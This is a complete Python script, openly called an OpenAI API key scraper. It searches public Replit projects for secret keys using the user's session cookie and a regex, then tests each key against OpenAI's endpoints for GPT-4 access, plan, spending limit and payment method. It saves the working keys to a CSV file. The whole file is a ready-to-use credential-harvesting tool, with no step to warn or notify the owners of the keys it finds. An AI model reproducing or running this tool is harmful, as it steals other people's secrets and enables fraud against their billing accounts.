import requests
import sys
import re
import time
import os
import csv

copyright_notice = """
COPYRIGHT NOTICE:

ading2210/openai-key-scraper: a Python script to scrape OpenAI API keys that are exposed on public Replit projects
Copyright (C) 2023 ading2210

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
""".strip()

graphql_url = "https://replit.com/graphql"
graphql_headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
  "Accept": "*/*",
  "Accept-Language": "en-US,en;q=0.5",
  "Content-Type": "application/json",
  "x-requested-with": "XMLHttpRequest",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "Pragma": "no-cache",
  "Cache-Control": "no-cache",
  "Referrer": "https://replit.com/search",
}

with open("graphql/SearchPageSearchResults.graphql") as f:
  graphql_query = f.read()

known_keys = []
if os.path.exists("found_keys.csv"):
  with open("found_keys.csv") as f:
    reader = csv.DictReader(f)
    for row in reader:
      known_keys.append(row["key"])

def perform_search(query, page, sort):
  payload = [{
    "operationName": "SearchPageSearchResults",
    "variables": {
      "options": {
        "onlyCalculateHits": False,
        "categories": ["Files"],
        "query": query,
        "categorySettings": {
          "docs": {},
          "files": {
            "page": {
              "first": 10,
              "after": str(page)
            },
            "sort": sort,
            "exactMatch": False,
            "myCode": False
          }
        }
      }
    },
    "query": graphql_query
  }]

  r = requests.post(graphql_url, headers=graphql_headers, json=payload)
  data = r.json()
  search = data[0]["data"]["search"]
  if not "fileResults" in search:
    if "message" in search:
      print("Replit returned an error. Retrying in 5 seconds...")
      print(search["message"])
      time.sleep(5)
      return perform_search(query, page, sort)
    return []
  file_results = data[0]["data"]["search"]["fileResults"]["results"]["items"]
  
  found_keys = []
  key_regex = "sk-[a-zA-Z0-9]{48}"
  for result in file_results:
    file_contents = result["fileContents"]
    matches = re.findall(key_regex, file_contents)
    found_keys += matches
  return list(set(found_keys))

def validate_key(key):
  validation_url = "https://api.openai.com/v1/models/gpt-4"
  subscription_url = "https://api.openai.com/v1/dashboard/billing/subscription"
  usage_url = "https://api.openai.com/v1/dashboard/user/usage" #unused

  headers = {
    "Authorization": f"Bearer {key}"
  }
  r = requests.get(validation_url, headers=headers)

  if r.status_code == 401:
    return False #token revoked or invalid
  gpt_4 = r.status_code != 404
  
  subscription = requests.get(subscription_url, headers=headers).json()
  expiration = subscription["access_until"]
  if expiration < time.time():
    return False #token expired
  hard_limit = subscription["hard_limit_usd"] or subscription["system_hard_limit_usd"]
  plan_id = subscription["plan"]["id"]
  payment_method = subscription["has_payment_method"]

  return {
    "key": key,
    "gpt4_allowed": gpt_4,
    "plan": plan_id,
    "limit": hard_limit,
    "payment_method": payment_method,
    "expiration": expiration
  }

def log_key(key_info):
  exists = os.path.exists("found_keys.csv")
  with open("found_keys.csv", "a") as f:
    writer = csv.DictWriter(f, fieldnames=key_info.keys())
    
    if not exists:
      writer.writeheader()

    writer.writerow(key_info)

def search_all_pages(query):
  found_keys = []
  valid_keys = []
  for page in range(1, 20):
    print(f"Checking page {page}...")
    keys = perform_search(query, page, "RecentlyModified")
    print(f"Found {len(keys)} matches (not validated)")

    for key in keys:
      if key in found_keys:
        continue
      if key in known_keys:
        print(f"Found working key (cached): {key}")
        continue
      
      key_info = validate_key(key)
      if not key_info:
        continue
      
      valid_keys.append(key)
      log_key(key_info)
      found_message = "Found working key: {key} (gpt4: {gpt4_allowed}, plan: {plan}, limit: {limit}, payment method: {payment_method}, expiration: {expiration})"
      print(found_message.format(**key_info))
    
    found_keys += keys

  return valid_keys

if __name__ == "__main__":
    print(copyright_notice)
    input("\n======\n\nHit enter to continue and to confirm that you have read the copyright notice for this program. ")
    print("\n======\n")

    if len(sys.argv) < 2:
        raise IndexError("Cookie not provided. Pass in your cookie as the next argument. Like 'python3 main.py \"cookie_here\"'")
    cookie = sys.argv[1]
    graphql_headers["Cookie"] = cookie

    queries_file = "queries.txt"

    with open(queries_file, "r") as f:
        queries = f.readlines()

    print(f"Total queries: {len(queries)}")
    print("Searching...")
    for query in queries:
        query = query.strip()
        print(f"Searching with query: {query}")
        all_keys = search_all_pages(query)
        all_keys = search_all_pages("sk- " + query)
        print("Search complete. Check found_keys.csv for results.")

    print("All searches completed.")
